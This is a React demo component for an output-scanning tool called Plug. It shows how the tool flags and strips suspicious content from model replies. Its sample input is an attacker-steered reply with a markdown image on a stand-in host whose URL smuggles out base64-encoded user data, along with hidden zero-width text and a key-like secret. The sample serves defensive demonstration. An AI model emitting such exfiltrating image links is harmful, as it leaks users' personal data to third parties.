"use client";

import { useMemo, useState } from "react";
import { plug } from "@/lib/plug";

// A reply an attacker steered: it renders an image whose URL smuggles the user's data out.
const SAMPLE =
  "Your order is on the way!\n\n![](https://tracker.badsite.example/pixel.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQuZXhhbXBsZSB8IDQyNDIgNDI0Mg==)\n\n" +
  "Docs: https://docs.example.com/shipping?page=2\n" +
  "Ignore this:​​​ hidden text sits between the colon and this sentence.\n" +
  "Internal key: sk-ant-api03-Zk3vQ9xT2mLp8RwYc5HnJd7A";

export default function PlugDemo() {
  const [input, setInput] = useState(SAMPLE);
  const [allow, setAllow] = useState("docs.example.com");
  const r = useMemo(() => plug(input, allow.split(",")), [input, allow]);

  return (
    <div className="grid gap-px overflow-hidden rounded-lg border border-edge bg-edge lg:grid-cols-3">
      <section className="flex flex-col bg-raise p-5">
        <h3 className="mb-4 font-display text-base font-semibold">1. Model output</h3>
        <textarea aria-label="Model output" value={input} onChange={(e) => setInput(e.target.value)} spellCheck={false}
          className="min-h-56 w-full flex-1 resize-none bg-transparent font-mono text-sm leading-relaxed outline-none" />
        <label className="mt-3 text-xs text-muted">
          Hosts you trust (comma separated)
          <input value={allow} onChange={(e) => setAllow(e.target.value)}
            className="mt-1 block w-full rounded border border-edge bg-ink px-3 py-2 font-mono text-sm text-paper" />
        </label>
      </section>
      <section className="bg-raise p-5">
        <h3 className="mb-4 font-display text-base font-semibold">2. What Plug found</h3>
        {r.findings.length ? (
          <ul className="space-y-3 text-sm">
            {r.findings.map((f, i) => (
              <li key={i} className="border-l-2 border-[#ff6b6b] pl-3">
                <span className="font-mono text-xs text-muted">{f.type}</span>
                <br />{f.detail}
              </li>
            ))}
          </ul>
        ) : <p className="text-sm text-muted">Nothing suspicious. This output passes through unchanged.</p>}
      </section>
      <section className="bg-raise p-5">
        <h3 className="mb-4 font-display text-base font-semibold">3. What your app renders</h3>
        <p className="whitespace-pre-wrap break-words font-mono text-sm leading-relaxed">{r.text}</p>
      </section>
    </div>
  );
}
